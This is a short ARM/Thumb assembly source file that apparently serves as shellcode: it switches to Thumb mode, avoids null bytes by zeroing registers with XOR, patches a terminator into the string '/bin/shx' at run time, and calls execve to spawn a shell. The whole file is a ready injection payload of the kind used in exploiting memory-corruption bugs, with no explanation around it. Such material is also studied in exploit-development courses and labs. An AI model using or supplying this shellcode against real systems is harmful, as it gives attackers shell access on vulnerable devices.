.section .text
.global _start

_start:
	.code 32		@ ARM mode
	add	r3, pc, #1	@ pc + 1 to force thumb mode
	bx	r3		@ branch and exchange instruction set

	.code 16
	add	r0, pc, #8		@ must be 4 bytes aligned, pc relative address of string, path to binary
	eor	r1, r1, r1		@ zero r1 using xor
	eor	r2, r2, r2		@ zero r2 using xor
	strb	r2, [r0, #7]		@ store nullbyte at end of string
	mov	r7, #11			@ execve syscall number
	svc	#1			@ invoke syscall

.ascii "/bin/shx"
